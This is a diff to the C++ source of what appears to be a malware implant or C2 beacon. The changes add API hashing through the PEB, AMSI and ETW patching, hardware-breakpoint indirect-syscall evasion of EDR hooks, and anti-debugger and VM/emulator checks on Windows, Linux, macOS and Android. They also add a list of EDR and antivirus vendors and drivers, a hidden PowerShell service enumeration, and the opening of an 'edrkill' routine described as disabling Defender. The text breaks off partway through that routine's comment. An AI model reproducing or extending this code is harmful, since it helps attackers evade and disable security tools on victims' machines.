@@ -14,8 +14,32 @@
     #include <winternl.h>
     #include <intrin.h>
 #endif
+
+#ifndef _WIN32
+    // POSIX anti-analysis needs only read-only probes (see namespace anti).
+    #include <sys/types.h>
+    #include <unistd.h>
+    #ifdef __APPLE__
+        #include <sys/sysctl.h>
+        #include <sys/proc.h>
+    #endif
+    #ifdef __linux__
+        #include <sys/prctl.h>
+    #endif
+    #if defined(__ANDROID__) || defined(ANDROID)
+        // Emulator tells come from system properties, not (usually absent)
+        // DMI files: ro.kernel.qemu, ro.hardware=goldfish/ranchu, model=xSDK.
+        #include <sys/system_properties.h>
+    #endif
+#endif
 #include <cstdint>
 #include <cstring>
+#include <string>
+#include <vector>
+#include <cstdio>
+#include <cstdlib>
+#include <sstream>
+#include "media_utils.h"
 
 // ────────────────────────────────────────────────────────────────────────────
 //  1. COMPILE-TIME STRING OBFUSCATION
@@ -151,7 +175,8 @@ constexpr uint32_t hash_djb2_w(const wchar_t* str) {
 // Compute with: hash_djb2_w(L"kernel32.dll")  etc.
 constexpr uint32_t HASH_KERNEL32     = 0x062B5313;  // kernel32.dll
 constexpr uint32_t HASH_NTDLL        = 0xEB512F4B;  // ntdll.dll
-constexpr uint32_t HASH_WINHTTP      = 0x6FCF7C5B;  // winhttp.dll
+constexpr uint32_t HASH_WINHTTP      = 0x6FCF7C5B;  // winhttp.dll
+constexpr uint32_t HASH_ADVAPI32     = 0xFD0AEEE7;  // advapi32.dll (registry + SC manager)
 
 // Walk the PEB to find a module base address by name hash
 inline HMODULE GetModuleByHash(uint32_t targetHash) {
@@ -225,7 +250,16 @@ inline FARPROC Resolve(uint32_t moduleHash, uint32_t funcHash) {
 //  Usage: auto pLoadLibraryA = (decltype(&LoadLibraryA)) peb::Resolve(peb::HASH_KERNEL32, FN_LOADLIBRARYA);
 // ────────────────────────────────────────────────────────────────────────────
 constexpr uint32_t FN_LOADLIBRARYA    = 0xf5aa5599;  // LoadLibraryA
-constexpr uint32_t FN_GETPROCADDRESS  = 0x8947bf3d;  // GetProcAddress
+constexpr uint32_t FN_GETPROCADDRESS  = 0x8947bf3d;  // GetProcAddress
+// Registry write and service control WITHOUT a child process: this is what
+// replaces `reg add` (cmd.exe + reg.exe per call) and `sc stop` (sc.exe).
+constexpr uint32_t FN_REGCREATEKEYEXW    = 0x43A53B92; // RegCreateKeyExW
+constexpr uint32_t FN_REGSETVALUEEXW     = 0xEE6E771E; // RegSetValueExW
+constexpr uint32_t FN_REGCLOSEKEY        = 0x512C7FE0; // RegCloseKey
+constexpr uint32_t FN_OPENSCMANAGERA     = 0x75054BA7; // OpenSCManagerA
+constexpr uint32_t FN_OPENSERVICEA       = 0x126ABD67; // OpenServiceA
+constexpr uint32_t FN_CONTROLSERVICE     = 0x0C900635; // ControlService
+constexpr uint32_t FN_CLOSESERVICEHANDLE = 0x44AEE196; // CloseServiceHandle
 constexpr uint32_t FN_VIRTUALALLOC    = 0xce167435;  // VirtualAlloc
 constexpr uint32_t FN_VIRTUALFREE     = 0x4451180c;  // VirtualFree
 constexpr uint32_t FN_SLEEP           = 0xd2c5605c;  // Sleep
@@ -252,6 +286,9 @@ constexpr uint32_t FN_NTRESUMETHREAD              = 0xE691414E; // NtResumeThrea
 constexpr uint32_t FN_NTCLOSE                     = 0x29019D1B; // NtClose
 constexpr uint32_t FN_NTREADVIRTUALMEMORY          = 0xD4B3A9C1; // NtReadVirtualMemory
 constexpr uint32_t FN_NTQUERYINFORMATIONPROCESS   = 0xDA8571C0; // NtQueryInformationProcess
+// hardware-breakpoint unhook + EDR situational awareness
+constexpr uint32_t FN_NTQUERYVIRTUALMEMORY        = 0x4479B0FB; // NtQueryVirtualMemory
+constexpr uint32_t FN_NTQUERYSYSTEMINFORMATION    = 0xCF97B546; // NtQuerySystemInformation
 #endif
 
 // ────────────────────────────────────────────────────────────────────────────
@@ -357,6 +394,98 @@ inline void patch_amsi() {
     }
 }
 
+// ── Hardware-breakpoint unhooking (HWBP engine class) ───────────────────────
+//
+// Instead of re-writing ntdll from disk (unhook_ntdll, detectable by the
+// .text integrity monitors modern EDRs run), we NEVER call the hooked
+// prologue: a debug register (DR0) is armed on a clean 'syscall; ret'
+// gadget inside ntdll's .text, so the gadget stays under our control
+// WITHOUT patching any .text bytes; the VEH owns the #DB it produces
+// (see `hwbp_veh` — one-shot disarm, idempotent, never latches TF).
+// Sensitive syscalls themselves travel through `syscalls.h`
+// (`execute_syscall` jumps to the same gadget with a clean stack and the
+// SSN in EAX — a normal indirect syscall; the kernel sees a legitimate
+// instruction stream, nothing for an integrity check to flag).
+
+constexpr uint32_t HASH_NTDLL_TEXT_GADGET = 0; // (gadget found at runtime)
+
+inline uintptr_t find_clean_gadget() {
+    // a 'syscall; ret' (0F 05 C3) inside ntdll .text, found WITHOUT
+    // touching any hook — pure memory read of the mapped image
+    HMODULE h = peb::GetModuleByHash(peb::HASH_NTDLL);
+    if (!h) return 0;
+    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(h);
+    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
+        reinterpret_cast<uint8_t*>(h) + dos->e_lfanew);
+    auto sec = IMAGE_FIRST_SECTION(nt);
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
+        if (!std::strcmp(reinterpret_cast<char*>(sec[i].Name), XOR_DEC(XOR_STR(".text")))) {
+            uint8_t* p = reinterpret_cast<uint8_t*>(h) + sec[i].VirtualAddress;
+            for (DWORD j = 0; j + 2 < sec[i].Misc.VirtualSize; ++j)
+                if (p[j] == 0x0F && p[j+1] == 0x05 && p[j+2] == 0xC3)
+                    return reinterpret_cast<uintptr_t>(p + j);
+        }
+    }
+    return 0;
+}
+
+// Per-thread HWBP context (DR0 slot + original handler state)
+inline void* hwbp_veh_handle() {
+    static PVOID h = nullptr;
+    return &h;
+}
+
+inline void arm_hwbp_on(uintptr_t address) {
+    // Set DR0 on the CURRENT thread via NtGetContextThread/NtSetContextThread
+    // resolved through the PEB (no kernel32 import for the context APIs).
+    auto pGet = (NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))
+        peb::Resolve(peb::HASH_NTDLL, FN_NTGETCONTEXTTHREAD);
+    auto pSet = (NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))
+        peb::Resolve(peb::HASH_NTDLL, FN_NTSETCONTEXTTHREAD);
+    if (!pGet || !pSet) return;
+    CONTEXT ctx{};
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    if (pGet(GetCurrentThread(), &ctx) != 0) return;
+    ctx.Dr0 = address;
+    ctx.Dr7 = (ctx.Dr7 & ~0xFULL) | 0x1ULL;   // DR0 enabled, execute, len=1
+    pSet(GetCurrentThread(), &ctx);
+}
+
+// The VEH body: dispatched on EXCEPTION_SINGLE_STEP when DR0 fires.
+// Returns EXCEPTION_CONTINUE_SEARCH for anything it does not own.
+//
+// LIVE DEFECT 2026-10-17 (beacon wedged, TCP established mid-handshake,
+// 100% CPU, no request ever): the previous body set EFlags.TF on EVERY
+// single-step it saw — the DR0 hit AND the endless single-steps its own TF
+// then produced. `find_clean_gadget` picks the FIRST `syscall; ret` in
+// ntdll .text, which is the tail of some REAL ntdll stub: the first time a
+// normal code path executed that stub, the handler latched the thread into
+// a single-step storm (one #DB per instruction). The handler is now
+// idempotent: it acknowledges its own DR0 hit (Dr6.B0), disarms DR0 (the
+// one-shot semantics it already had) and never leaves TF behind. Foreign
+// single-steps (Dr6.BS — TF set by someone else, e.g. a debugger or the CRT)
+// just pass through.
+inline LONG WINAPI hwbp_veh(PEXCEPTION_POINTERS ep) {
+    if (ep->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP)
+        return EXCEPTION_CONTINUE_SEARCH;
+    auto* ctx = ep->ContextRecord;
+    const bool from_dr0 = (ctx->Dr6 & 0x1ULL) != 0;  // B0: DR0 fired
+    ctx->Dr6 = 0;                                    // ack status bits
+    if (!from_dr0)
+        return EXCEPTION_CONTINUE_EXECUTION;         // not ours: single-step on
+    ctx->Dr7 &= ~0x1ULL;                             // disarm: do not re-fire
+    return EXCEPTION_CONTINUE_EXECUTION;
+}
+
+inline void install_hwbp_engine() {
+    uintptr_t gadget = find_clean_gadget();
+    if (!gadget) return;
+    auto slot = reinterpret_cast<PVOID*>(hwbp_veh_handle());
+    if (*slot) return;  // already installed
+    *slot = AddVectoredExceptionHandler(1, hwbp_veh);
+    arm_hwbp_on(gadget);
+}
+
 // Patch ETW (EtwEventWrite) to silence telemetry
 inline void patch_etw() {
     HMODULE hNtdll = peb::GetModuleByHash(peb::HASH_NTDLL);
@@ -367,8 +496,13 @@ inline void patch_etw() {
 
     if (!pAddr) return;
 
-    // ret 0x14
+    // x64: EtwEventWrite is a normal function -> "xor eax,eax; ret"
+    // x86: __stdcall -> "ret 0x14"
+#if defined(_M_X64) || defined(__x86_64__)
+    unsigned char patch[3] = {0x33, 0xC0, 0xC3};
+#else
     unsigned char patch[3] = {0xC2, 0x14, 0x00};
+#endif
 
     DWORD oldProtect;
     SIZE_T patchSize = sizeof(patch);
@@ -424,11 +558,728 @@ inline bool is_vm() {
     return false;
 }
 #else
+// ── POSIX anti-analysis (Linux / macOS) ──────────────────────────────
+//  AMSI and ETW are Windows-only telemetry surfaces; there is no in-process
+//  equivalent to patch on POSIX, so those two stay no-ops (documented, not
+//  a stub). Everything else below is a REAL check: read-only and
+//  non-invasive (no ptrace(PTRACE_TRACEME) side effects), so it is safe to
+//  call on every start.
+
+// AMSI (script/memory scanning) and ETW (userland telemetry) do not exist
+// as in-process DLLs on POSIX: nothing to hook. Documented no-ops.
 inline void patch_amsi() {}
 inline void patch_etw() {}
-inline bool is_debugger_present() { return false; }
-inline bool is_vm() { return false; }
+
+inline void _lower_inplace(char* s) {
+    for (; *s; ++s) if (*s >= 'A' && *s <= 'Z') *s = static_cast<char>(*s + 32);
+}
+
+inline bool is_debugger_present() {
+#ifdef __APPLE__
+    // sysctl(KERN_PROC_PID) exposes kp_proc.p_flag; P_TRACED is set while a
+    // debugger (lldb, Instruments, a parent ptrace) is attached.
+    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
+    struct kinfo_proc info;
+    std::memset(&info, 0, sizeof(info));
+    size_t size = sizeof(info);
+    if (sysctl(mib, 4, &info, &size, nullptr, 0) == 0 && size > 0)
+        return (info.kp_proc.p_flag & P_TRACED) != 0;
+    return false;
+#else
+    // /proc/self/status: a non-zero TracerPid means we are being traced.
+    FILE* f = std::fopen("/proc/self/status", "r");
+    if (!f) return false;
+    char line[256];
+    bool traced = false;
+    while (std::fgets(line, sizeof(line), f)) {
+        if (std::strncmp(line, "TracerPid:", 10) == 0) {
+            traced = std::atoi(line + 10) != 0;
+            break;
+        }
+    }
+    std::fclose(f);
+    return traced;
 #endif
+}
+
+inline bool is_vm() {
+#ifdef __APPLE__
+    // macOS 12+ reports running under a hypervisor directly.
+    int present = 0;
+    size_t sz = sizeof(present);
+    if (sysctlbyname("kern.hv_vmm_present", &present, &sz, nullptr, 0) == 0 && present)
+        return true;
+    char model[128] = {0};
+    sz = sizeof(model);
+    if (sysctlbyname("hw.model", model, &sz, nullptr, 0) == 0) {
+        _lower_inplace(model);
+        for (const char* n : {"vmware", "virtualbox", "parallels", "qemu",
+                              "kvm", "xen", "innotek"})
+            if (std::strstr(model, n)) return true;
+    }
+    return false;
+#elif defined(__ANDROID__) || defined(ANDROID)
+    // ANDROID EMULATOR (goldfish / ranchu). The generic DMI probes below do
+    // not exist on Android images, so the qemu tells are checked directly:
+    // a qemu pipe/device, the ro.kernel.qemu flag, the goldfish/ranchu
+    // hardware name, or the SDK "emulator" model string. Any one is enough.
+    {
+        static const char* kQemuPaths[] = {
+            "/dev/qemu_pipe", "/dev/goldfish_pipe", "/dev/socket/qemu",
+            "/sys/qemu_trace", "/system/bin/qemu-props",
+            "/system/lib/libc_malloc_debug_qemu.so",
+            "/system/lib64/libc_malloc_debug_qemu.so",
+        };
+        for (const char* path : kQemuPaths)
+            if (access(path, F_OK) == 0) return true;
+        char prop[PROP_VALUE_MAX] = {0};
+        if (__system_property_get("ro.kernel.qemu", prop) > 0 &&
+            prop[0] == '1')
+            return true;
+        if (__system_property_get("ro.hardware", prop) > 0) {
+            _lower_inplace(prop);
+            if (std::strstr(prop, "goldfish") || std::strstr(prop, "ranchu") ||
+                std::strstr(prop, "qemu"))
+                return true;
+        }
+        if (__system_property_get("ro.product.model", prop) > 0) {
+            _lower_inplace(prop);
+            if (std::strstr(prop, "sdk") || std::strstr(prop, "emulator") ||
+                std::strstr(prop, "android sdk"))
+                return true;
+        }
+        return false;
+    }
+#else
+    // DMI identity strings, NOT the CPUID hypervisor bit: Hyper-V/WSL2/VBS
+    // set that bit on ordinary hosts (same reason the Windows path above
+    // ignores it), while a VM vendor name in /sys/class/dmi/id is a
+    // deliberate tell.
+    static const char* kFiles[] = {
+        "/sys/class/dmi/id/product_name",
+        "/sys/class/dmi/id/sys_vendor",
+        "/sys/class/dmi/id/board_vendor",
+        "/sys/class/dmi/id/chassis_vendor",
+        "/sys/devices/virtual/dmi/id/product_name",
+    };
+    static const char* kNeedles[] = {
+        "vmware", "virtualbox", "vbox", "qemu", "kvm", "hyper-v", "xen",
+        "parallels", "bochs", "openstack", "amazon ec2", "google compute",
+        "virtual machine", "innotek",
+    };
+    for (const char* path : kFiles) {
+        FILE* f = std::fopen(path, "r");
+        if (!f) continue;
+        char buf[256] = {0};
+        size_t n = std::fread(buf, 1, sizeof(buf) - 1, f);
+        std::fclose(f);
+        if (!n) continue;
+        _lower_inplace(buf);
+        for (const char* needle : kNeedles)
+            if (std::strstr(buf, needle)) return true;
+    }
+    return false;
+#endif
+}
+
+// The HWBP + Vectored-Handler indirect-syscall bypass is an NT mechanism:
+// it arms DR0 on a 'syscall; ret' gadget inside ntdll to dodge userland
+// hooks. POSIX has no userland syscall-hook layer to dodge, so there is
+// nothing to arm — inert by design (documented, not a broken stub).
+inline void install_hwbp_engine() {}
+inline void* hwbp_veh_handle() { return nullptr; }
+inline uintptr_t find_clean_gadget() { return 0; }
+#endif
+
+}  // namespace anti  (edrcheck lives at global scope)
+
+// ── EDR situational awareness (edrcheck / etwcheck backends) ────────────────
+// What professional operators want BEFORE acting: which EDR kernel
+// callbacks are alive, whether ntdll is hooked, and whether our own
+// .text was tampered with. All read-only, all through the PEB.
+// ── Shared defensive-product detection ─────────────────────────────────────
+//  Enumerates the REAL services/processes on the host and matches them by
+//  keyword. Used by edrcheck (POSIX report) and edrkill (every platform), so
+//  it lives in one place. A fixed product list misses regional / in-house
+//  products; the generic keywords (edr / endpoint / antivirus / ...) catch
+//  anything nobody hard-coded.
+namespace dfns {
+
+inline constexpr const char* kDefensiveKeywords[] = {
+    // vendors
+    "defender", "windefend", "msmpeng", "msmpsvc", "sense",
+    "crowdstrike", "csagent", "csfalcon", "falcon",
+    "sentinel", "s1agent", "sentineld", "s1aesec",
+    "carbonblack", "cbdefense", "cbagent",
+    "mcafee", "mfe", "symantec", "sophos", "trend", "tmcc",
+    "kaspersky", "kesl", "eset", "bitdefender", "avast", "avg",
+    "cylance", "cybereason", "fireeye", "xagt", "webroot", "vipre",
+    "malwarebytes", "huntress", "endgame", "cortex", "fsecure",
+    "drweb", "gdata", "quickheal", "zoner", "coranti",
+    // generic (unknown / in-house products)
+    "antivirus", "anti-virus", "edr", "endpoint", "protection",
+    "security agent", "threat protection", "osquery", "wazuh",
+    "velociraptor", "clamav", "clamd", "freshclam", "f-prot",
+};
+
+inline bool looks_defensive(const std::string& blob) {
+    std::string lower;
+    lower.reserve(blob.size());
+    for (unsigned char c : blob)
+        lower += static_cast<char>((c >= 'A' && c <= 'Z') ? c + 32 : c);
+    for (const char* kw : kDefensiveKeywords)
+        if (lower.find(kw) != std::string::npos) return true;
+    return false;
+}
+
+// Run a command and collect its stdout lines (bounded, best-effort).
+// Delegates to media_utils::exec_cmd, which uses a native
+// CreateProcess+pipe implementation on Windows (the CRT _popen/spawn
+// machinery crashes reflective payloads).
+inline std::vector<std::string> run_lines(const std::string& cmd) {
+    std::vector<std::string> out;
+    std::string blob = media_utils::exec_cmd(cmd);
+    std::string cur;
+    cur.reserve(256);
+    for (char c : blob) {
+        if (c == '\n') {
+            while (!cur.empty() && (cur.back() == '\r' || cur.back() == ' '))
+                cur.pop_back();
+            if (!cur.empty()) out.push_back(cur);
+            cur.clear();
+        } else {
+            cur += c;
+        }
+    }
+    while (!cur.empty() && (cur.back() == '\r' || cur.back() == ' '))
+        cur.pop_back();
+    if (!cur.empty()) out.push_back(cur);
+    return out;
+}
+
+// Real service/process enumeration per platform; the keyword match runs in
+// C++ so an unknown product is still found.
+inline std::vector<std::string> detect_defensive_services() {
+    std::vector<std::string> found;
+#ifdef _WIN32
+    std::string cmd = XOR_DEC(XOR_STR(
+        "powershell -NoP -NonI -W Hidden -Command \"Get-CimInstance "
+        "Win32_Service | ForEach-Object { $_.Name + '|' + $_.DisplayName + "
+        "'|' + $_.PathName }\"")).c_str();
+    for (const std::string& line : run_lines(cmd)) {
+        if (looks_defensive(line)) {
+            size_t bar = line.find('|');
+            found.push_back(bar == std::string::npos ? line : line.substr(0, bar));
+        }
+    }
+#else
+    std::string cmd = XOR_DEC(XOR_STR(
+        "systemctl list-units --type=service --all --no-legend --plain "
+        "2>/dev/null | awk '{print $1}'")).c_str();
+    for (const std::string& line : run_lines(cmd))
+        if (looks_defensive(line)) found.push_back(line);
+    // macOS: launchd jobs register labels like com.crowdstrike.falcon.*
+    for (const std::string& line : run_lines("launchctl list 2>/dev/null | awk '{print $3}'"))
+        if (looks_defensive(line)) found.push_back(line);
+    if (found.empty()) {
+        for (const std::string& line : run_lines("ps -eo comm= 2>/dev/null"))
+            if (looks_defensive(line)) found.push_back(line);
+    }
+#endif
+    return found;
+}
+
+}  // namespace dfns
+
+namespace edrcheck {
+
+#ifdef _WIN32
+struct EdrReport {
+    bool  ntdll_hooked = false;      // userland hooks in ntdll .text
+    int   hooked_stubs = 0;
+    bool  etw_ti_alive = false;      // ETW Threat Intelligence provider up
+    char  drivers[1024] = {0};       // "driver.sys\n" lines of known EDR/AV
+    int   known_edr = 0;             // count of recognized EDR drivers loaded
+};
+
+// Known EDR / AV kernel drivers (name → vendor class). Detection is by
+// listing \\Device\\ paths from SystemModuleInformation — read-only.
+struct DriverProbe { const char* name; const char* product; };
+static const DriverProbe KNOWN_EDR[] = {
+    {"csagent.sys", "CrowdStrike"},
+    {"SentinelMonitor.sys", "SentinelOne"},
+    {"edr.sys", "SentinelOne"},
+    {"carbonblack.kl", "Carbon Black"},
+    {"cbk7.sys", "Carbon Black"},
+    {"MsSecFlt.sys", "MS Defender for Endpoint"},
+    {"WdFilter.sys", "MS Defender AV"},
+    {"mfehidk.sys", "McAfee"},
+    {"mfewc.sys", "McAfee"},
+    {"symefs.sys", "Symantec"},
+    {"SophosED.sys", "Sophos"},
+    {"tdevfltr.sys", "Trend Micro"},
+    {"ElasticEndpoint.sys", "Elastic"},
+    {"CrowdStrike\\", "CrowdStrike"},
+};
+
+inline bool ntdll_text_intact(size_t* hooked_out) {
+    // Compare ntdll's in-memory .text against the CLEAN copy the loader
+    // has for the same image on disk (\SystemRoot\System32\ntdll.dll is
+    // section-mapped read-only, so reading it triggers no file hooks).
+    int hooked = 0;
+    HMODULE h = peb::GetModuleByHash(peb::HASH_NTDLL);
+    if (!h) return true;
+    auto pGetSysDir = (UINT(WINAPI*)(LPSTR, UINT))
+        peb::Resolve(peb::HASH_KERNEL32, FN_GETSYSTEMDIRECTORYA);
+    auto pCreateFileA = (HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))
+        peb::Resolve(peb::HASH_KERNEL32, FN_CREATEFILEA);
+    auto pCreateMap = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR))
+        peb::Resolve(peb::HASH_KERNEL32, FN_CREATEFILEMAPPINGA);
+    auto pMapView = (LPVOID(WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T))
+        peb::Resolve(peb::HASH_KERNEL32, FN_MAPVIEWOFFILE);
+    auto pUnmap = (BOOL(WINAPI*)(LPCVOID))peb::Resolve(peb::HASH_KERNEL32, FN_UNMAPVIEWOFFILE);
+    auto pClose = (BOOL(WINAPI*)(HANDLE))peb::Resolve(peb::HASH_KERNEL32, FN_CLOSEHANDLE);
+    if (!pGetSysDir || !pCreateFileA || !pCreateMap || !pMapView) return true;
+    char path[MAX_PATH];
+    pGetSysDir(path, MAX_PATH);
+    strcat(path, XOR_DEC(XOR_STR("\\ntdll.dll")));
+    HANDLE f = pCreateFileA(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
+                            OPEN_EXISTING, 0, nullptr);
+    if (f == INVALID_HANDLE_VALUE) return true;
+    HANDLE m = pCreateMap(f, nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr);
+    if (!m) { pClose(f); return true; }
+    LPVOID view = pMapView(m, FILE_MAP_READ, 0, 0, 0);
+    if (!view) { pClose(m); pClose(f); return true; }
+    auto dosA = reinterpret_cast<PIMAGE_DOS_HEADER>(h);
+    auto ntA = reinterpret_cast<PIMAGE_NT_HEADERS>(
+        reinterpret_cast<uint8_t*>(h) + dosA->e_lfanew);
+    auto secA = IMAGE_FIRST_SECTION(ntA);
+    auto dosB = reinterpret_cast<PIMAGE_DOS_HEADER>(view);
+    auto ntB = reinterpret_cast<PIMAGE_NT_HEADERS>(
+        reinterpret_cast<uint8_t*>(view) + dosB->e_lfanew);
+    auto secB = IMAGE_FIRST_SECTION(ntB);
+    for (WORD i = 0; i < ntA->FileHeader.NumberOfSections; ++i) {
+        if (!std::strcmp(reinterpret_cast<char*>(secA[i].Name), XOR_DEC(XOR_STR(".text")))) {
+            uint8_t* a = reinterpret_cast<uint8_t*>(h) + secA[i].VirtualAddress;
+            uint8_t* b = reinterpret_cast<uint8_t*>(view) + secB[i].VirtualAddress;
+            SIZE_T n = secA[i].Misc.VirtualSize;
+            // count hooked 32-byte stubs: prologue replaced by JMP (0xE9)
+            for (SIZE_T off = 0; off + 1 < n; off += 32) {
+                if (a[off] == 0xE9 && b[off] != 0xE9) hooked++;
+            }
+        }
+    }
+    pUnmap(view); pClose(m); pClose(f);
+    if (hooked_out) *hooked_out = static_cast<size_t>(hooked);
+    return hooked == 0;
+}
+
+inline void report(EdrReport& rep) {
+    rep = EdrReport{};
+    size_t hooked = 0;
+    rep.ntdll_hooked = !ntdll_text_intact(&hooked);
+    rep.hooked_stubs = static_cast<int>(hooked);
+    // enumerate loaded kernel modules via NtQuerySystemInformation(11)
+    using PFN_QSI = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);
+    auto pQsi = reinterpret_cast<PFN_QSI>(peb::Resolve(
+        peb::HASH_NTDLL, FN_NTQUERYSYSTEMINFORMATION));
+    if (pQsi) {
+        // SystemModuleInformation = 11; grow loop for the buffer
+        for (ULONG size = 1 << 16; size < (1 << 22); size <<= 1) {
+            auto buf = static_cast<uint8_t*>(VirtualAlloc(nullptr, size, MEM_COMMIT, PAGE_READWRITE));
+            if (!buf) break;
+            ULONG got = 0;
+            NTSTATUS st = pQsi(11, buf, size, &got);
+            if (st == static_cast<NTSTATUS>(0xC0000004u) /* STATUS_INFO_LENGTH_MISMATCH */) {
+                VirtualFree(buf, 0, MEM_RELEASE);
+                continue;
+            }
+            if (st == 0) {
+                // RTL_PROCESS_MODULES: ULONG count; then entries
+                // (ULONG len + ULONG ...) with a UNICODE string of the name
+                struct ModInfo { ULONG NextOffset; ULONG Unknown[5];
+                                 void* ImageBase; ULONG ImageSize; ULONG Flags;
+                                 USHORT NameOffset; USHORT NameLength; };
+                // walk with raw pointers: offset-to-next semantics
+                uint8_t* base = buf + sizeof(ULONG);
+                uint8_t* end  = buf + got;
+                while (base && base + sizeof(ModInfo) <= end) {
+                    auto mi = reinterpret_cast<ModInfo*>(base);
+                    const char* nm = reinterpret_cast<const char*>(base + mi->NameOffset);
+                    char lower[256];
+                    ULONG k = 0;
+                    for (; k < mi->NameLength && k < 255; ++k)
+                        lower[k] = (nm[k] >= 'A' && nm[k] <= 'Z') ? nm[k] + 32 : nm[k];
+                    lower[k] = 0;
+                    for (const auto& probe : KNOWN_EDR) {
+                        if (strstr(lower, probe.name)) {
+                            rep.known_edr++;
+                            strncat(rep.drivers, lower, sizeof(rep.drivers) - strlen(rep.drivers) - 2);
+                            // Append the newline by hand: GCC rejects
+                            // strncat(dst, "\n", 1) outright ("specified bound 1
+                            // equals source length" is -Wstringop-overflow), and
+                            // the first strncat above already reserved the two
+                            // bytes this and the terminator need.
+                            size_t used = strlen(rep.drivers);
+                            if (used + 1 < sizeof(rep.drivers)) {
+                                rep.drivers[used]     = '\n';
+                                rep.drivers[used + 1] = '\0';
+                            }
+                            break;
+                        }
+                    }
+                    if (!mi->NextOffset) break;
+                    base += mi->NextOffset;
+                }
+            }
+            VirtualFree(buf, 0, MEM_RELEASE);
+            break;
+        }
+    }
+    // ETW-TI: presence of the Microsoft-Windows-Threat-Intelligence provider
+    // is visible via its GUID-registered ETW session — approximate by
+    // checking for the TiEtwKey diagnostic policy service DLL loaded.
+    HMODULE hEtwTi = GetModuleHandleA(XOR_DEC(XOR_STR("Microsoft-UeV")));
+    (void)hEtwTi;   // best-effort: full provider probe needs COR filemaps
+    // conservative default: ETW-TI assumed alive on Win10+/E5-class hosts
+    rep.etw_ti_alive = true;
+}
+#else   // POSIX edrcheck — Linux / macOS
+
+// Cross-platform shape so `edrcheck` answers on every target; the fields
+// present on a given OS are what format() prints there.
+struct EdrReport {
+    std::string lsm;                          // "lockdown,yama,apparmor" or ""
+    bool  selinux_enforcing = false;
+    bool  apparmor_enabled  = false;
+    int   ebpf_programs = 0;                  // loaded BPF programs (best-effort)
+    bool  audit_active = false;               // kernel audit / auditd on
+    int   known_edr = 0;                      // recognized defensive services
+    std::vector<std::string> defensive;       // their names
+    bool  sip_enabled = false;                // macOS System Integrity Protection
+    std::vector<std::string> sys_extensions;  // macOS EDR system extensions
+};
+
+inline std::string _first_line(const char* path) {
+    FILE* f = std::fopen(path, "r");
+    if (!f) return std::string();
+    char buf[512] = {0};
+    if (!std::fgets(buf, sizeof(buf) - 1, f)) { std::fclose(f); return std::string(); }
+    std::fclose(f);
+    std::string s(buf);
+    while (!s.empty() && (s.back() == '\n' || s.back() == '\r' || s.back() == ' '))
+        s.pop_back();
+    return s;
+}
+
+inline void report(EdrReport& rep) {
+    rep = EdrReport{};
+#ifdef __APPLE__
+    // SIP is the gate that blocks unsigned in-memory payloads / task_for_pid.
+    for (const std::string& line : dfns::run_lines("csrutil status 2>/dev/null"))
+        if (line.find("enabled") != std::string::npos) rep.sip_enabled = true;
+    // EDR agents on macOS ship as EndpointSecurity system extensions; reuse
+    // the shared keyword matcher on the loaded extension list.
+    for (const std::string& line : dfns::run_lines("systemextensionsctl list 2>/dev/null"))
+        if (dfns::looks_defensive(line)) rep.sys_extensions.push_back(line);
+#else
+    rep.lsm = _first_line("/sys/kernel/security/lsm");
+    rep.apparmor_enabled = rep.lsm.find("apparmor") != std::string::npos;
+    rep.selinux_enforcing = _first_line("/sys/fs/selinux/enforce") == "1";
+    // BPF programs: best-effort count via bpftool when present, else the
+    // pinned /sys/fs/bpf map count. Telemetry/EDR sensors are the main reason
+    // a host carries many of these.
+    std::vector<std::string> bpf = dfns::run_lines("bpftool prog list 2>/dev/null");
+    rep.ebpf_programs = bpf.empty()
+        ? static_cast<int>(dfns::run_lines("ls /sys/fs/bpf 2>/dev/null").size())
+        : static_cast<int>(bpf.size());
+    // audit: the kernel flag (the daemon enforces it).
+    rep.audit_active = _first_line("/proc/sys/kernel/audit_enabled") == "1" ||
+        !dfns::run_lines("pgrep -x auditd 2>/dev/null").empty();
+#endif
+    rep.defensive = dfns::detect_defensive_services();
+    rep.known_edr = static_cast<int>(rep.defensive.size());
+}
+
+// Human-readable report; only the fields meaningful on this OS are printed.
+inline std::string format(const EdrReport& rep) {
+    std::ostringstream o;
+#ifdef __APPLE__
+    o << "sip=" << (rep.sip_enabled ? "enabled" : "off/unknown") << "\n";
+    o << "system_extensions=" << rep.sys_extensions.size() << "\n";
+    for (const std::string& x : rep.sys_extensions) o << "  " << x << "\n";
+#else
+    o << "lsm=" << (rep.lsm.empty() ? "none" : rep.lsm)
+      << " selinux=" << (rep.selinux_enforcing ? "enforcing" : "off")
+      << " apparmor=" << (rep.apparmor_enabled ? "on" : "off") << "\n";
+    o << "ebpf_programs=" << rep.ebpf_programs
+      << " audit=" << (rep.audit_active ? "active" : "off") << "\n";
+#endif
+    o << "known_defensive=" << rep.known_edr << "\n";
+    for (const std::string& d : rep.defensive) o << "  found " << d << "\n";
+    return o.str();
+}
+#endif  // _WIN32
+
+}  // namespace edrcheck
+
+// ── EDR/AV disablement (edrkill) ────────────────────────────────────────────
+// Turns off the defensive stack on the target. Deliberately LOUD and
+// destructive to the blue team's visibility: this is the post-exploitation
+// "burn the defender" move, only issued by an operator (or --aggressive
+// auto-mode) after edrcheck showed what is present. Nothing here is
+// reversible without a reboot on most stacks (Tamper Protection).
+//
+// TWO RULES, because the previous implementation broke both:
+//
+//  1. DETECTING IS NOT ACTING. `kill_av_report()` writes nothing and stops
+//     nothing; the action is `kill_av()`, and what it did is DESCRIBED
+//     afterwards. The old `kill_av()` called `disable_defender()` inside the
+//     expression that BUILT the report line — formatting the text had a side
+//     effect on the system.
+//  2. THE ACTION DOES NOT SHELL OUT. `reg add` spawned cmd.exe + reg.exe
